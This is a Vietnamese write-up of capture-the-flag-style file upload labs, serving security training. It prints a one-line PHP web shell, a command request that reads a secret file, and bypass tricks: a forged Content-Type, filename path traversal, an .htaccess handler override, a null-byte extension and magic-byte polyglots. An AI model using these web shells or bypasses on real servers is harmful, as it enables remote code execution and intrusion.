# File Upload
## Labs

### LAB: Remote code execution via web shell upload
**Yêu cầu**: Lab có lỗ hổng ở chức năng upload ảnh. Nhiệm vụ: tải lên PHP web shell, dùng nó lấy nội dung file `/home/carlos/secret` rồi nộp bí mật đó. Đăng nhập: `wiener:peter`

**Thực hiện**
- Upload file shell lên là thành công.
- Nội dung shell:
    ```
    <?php system($_GET['cmd']); ?>
    ```
- Upload thành công giờ thì tìm xem file đó ở đâu. Khi mà UI được load thì ảnh sẽ được load theo ta có thể viewsource để xem.
![alt text](img/image-1.png)
- Đó giờ thì thực hiện truy cập.
![alt text](img/image-2.png)
___

### LAB: Web shell upload via Content-Type restriction bypass
**Yêu cầu**: Lab có lỗ hổng ở chức năng upload ảnh. Nhiệm vụ: tải lên PHP web shell, dùng nó lấy nội dung file `/home/carlos/secret` rồi nộp bí mật đó. Đăng nhập: `wiener:peter`

**Thực hiện**
- Upload file shell lên và tùy chỉnh content-type thành image/jpeg.
![alt text](img/image.png)
`GET fulab1.php?cmd=cat%20/home/carlos/secret` để đọc thông tin

**Vấn đề**
Chỉ chặn bằng việc kiểm tra header Content-type -> Có thể bypass dễ dàng
___

### LAB: Web shell upload via path traversal
**Yêu cầu**: Lab có lỗ hổng upload ảnh, nhưng server chặn thực thi file. Nhiệm vụ: khai thác lỗ hổng phụ để bypass, tải lên PHP web shell, dùng nó lấy nội dung file `/home/carlos/secret`, rồi nộp bí mật đó. Đăng nhập: `wiener:peter`.

**Thực hiện**
- Upload shell bình thường và chỉnh sửa lại gói tin upload đó.
Thay đổi `filename` và xem kết quả đầu ra. Thông thường việc encode và decode url là do server cài đặt (APACHE). 
![alt text](img/image-3.png)
- Giờ thì truy cập vào file shell.
![alt text](img/image-4.png)

**Vấn đề**
Trong bài lab khi upload shell lên thì shell ở thư mục `files/avatars` và thư mục này không cho phép thực thi shell -> Cho nên ta tìm cách upload ở thư mục khác có quyền thực thi
>Tips 💡
Web servers often use the filename field in multipart/form-data requests to determine the name and location where the file should be saved.
___

### LAB: Web shell upload via extension blacklist bypass
**Yêu cầu**: Lab có lỗ hổng upload ảnh, chặn một số phần mở rộng file nhưng có lỗi trong cấu hình blacklist. Nhiệm vụ: bypass blacklist, tải lên PHP web shell, dùng nó lấy nội dung file `/home/carlos/secret`, rồi nộp bí mật đó. Đăng nhập: `wiener:peter`.

**Thực hiện**
- Ở các phiên bản cũ APACHE thì cho phép trong thư mục tồn tại 1 file `.htaccess`. File này có vai trò ghi đè các cấu hình lên chính thư mục chứa nó.
Vì thế trong bài này chúng ta cần upload 1 file `.htaccess` để ghi đè cấu hình xử lí các file có extension `php...`.
- File `.htaccess` có nội dung như sau:
    ```
    AddType application/x-httpd-php .php5
    ```
- Ban đầu trước khi có file cấu hình
![alt text](img/image-5.png)
- Sau khi upload file ghi đè cấu hình
![alt text](img/image-6.png)

**Vấn đề**
Các file extension là `php...` thì không được thực thi mà được đưa ra dạng plaintext. Vấn đề này là các định nghĩa cấu hình server.
___

### LAB: Web shell upload via obfuscated file extension
**Yêu cầu**: Lab có lỗ hổng upload ảnh, chặn một số phần mở rộng file nhưng có thể bypass bằng kỹ thuật obfuscation. Nhiệm vụ: lợi dụng obfuscation để tải lên PHP web shell, dùng nó lấy nội dung file `/home/carlos/secret`, rồi nộp bí mật đó.

**Thực hiện**
- Cách tấn công ở đây là nullbyte injection. Ở phiên bản cũ PHP 5.3.x đổ xuống, ở bước kiểm tra `filename` phía backend sẽ kiểm tra chuỗi sau `.` cuối cùng có phải là `jpg` hay `png`. Còn khi chuẩn hóa vào đường dẫn thì PHP chỉ kiểm tra đến kí tự cuối cùng trước `null`( này cũng là do PHP được code bởi C mà đọc chuỗi trong C thì dừng khi gặp kí tự `null` đầu tiên)
- `filename="a.php%00.jpg"`
![alt text](img/image-7.png)
- Thực thi shell
![alt text](img/image-8.png)

**Vấn đề**
Server chặn các gói tin upload không phải định dạng ảnh bằng việc check extension của file. Với các extension khác nhau thì server sẽ xử lí khác nhau ( ảnh thì hiện thị ra ảnh, nếu file php thì sẽ thực thi). Tuy nhiên vì không up được file php lên mà chỉ up file ảnh cho nên hệ thống xử lí các file đó dưới định dạng ảnh.
___

### LAB: Remote code execution via polyglot web shell upload
**Yêu cầu**: Lab có lỗ hổng upload ảnh, kiểm tra nội dung file để xác thực hình ảnh nhưng vẫn có thể upload và thực thi mã trên server. Nhiệm vụ: bypass kiểm tra, tải lên PHP web shell, dùng nó lấy nội dung file `/home/carlos/secret`, rồi nộp bí mật đó.

**Thực hiện**
- Tiến hành upload file shell lên. Sau đó chèn thêm các magic bytes của img/png ở đầu nội dung file và theo dõi phản hồi.
![List of file signatures](img/image-9.png)
- Nên chỉnh sửa theo từng bytes để chính xác hơn.
![alt text](img/image-10.png)
- Thực thi được shell
![alt text](img/image-11.png)

**Vấn đề**
Phía server thay vì chỉ dựa vào `Content-Type` để xử lí thì còn dựa vào `MIMETYPE` thông qua magic bytes ở đầu file.
___

### LAB: Web shell upload via race condition
**Yêu cầu**: Lab có lỗ hổng upload ảnh, kiểm tra file chặt chẽ nhưng có thể bypass bằng cách khai thác `race condition`. Nhiệm vụ: tận dụng race condition để tải lên PHP web shell, dùng nó lấy nội dung file `/home/carlos/secret`, rồi nộp bí mật đó.

**Sample code**
```
<?php
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];

// temporary move
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
} else {
    unlink($target_file);
    echo "Sorry, there was an error uploading your file.";
    http_response_code(403);
}

function checkViruses($fileName) {
    // checking for viruses
    ...
}

function checkFileType($fileName) {
    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
    if($imageFileType != "jpg" && $imageFileType != "png") {
        echo "Sorry, only JPG & PNG files are allowed\n";
        return false;
    } else {
        return true;
    }
}
?>
```
**Thực hiện**
- Chúng ta cần 2 gói tin:
    1. Gói tin upload shell
    2. Gói tin thực thi shell
- Vì cần thực hiện trong race window nên chúng ta chuẩn bị trước để khai thác trong thời gian tối thiểu.
![alt text](img/image-13.png)
![alt text](img/image-12.png)
- Tiến hành gửi song song 2 gói tin để nhận kết quả. Thông thường vì thời gian chưa đủ nhanh nên có thể lúc được lúc không. Để tăng khả năng tấn công có thể dùng `Turbo Intruder`
- Thành công
![alt text](img/image-14.png)

**Vấn đề**: Sau khi đọc qua source code thì ta sẽ thấy khi file được upload lên thì nó sẽ được đưa đến thư mục `$target_file`. Rồi trong bước kiểm tra sau đó mới bị xóa. Vậy thì có tồn tại 1 khoảng thời gian nhỏ file nằm trong thư mục trước khi bị xóa. Tận dụng điều này để mở race window và up shell thành công.

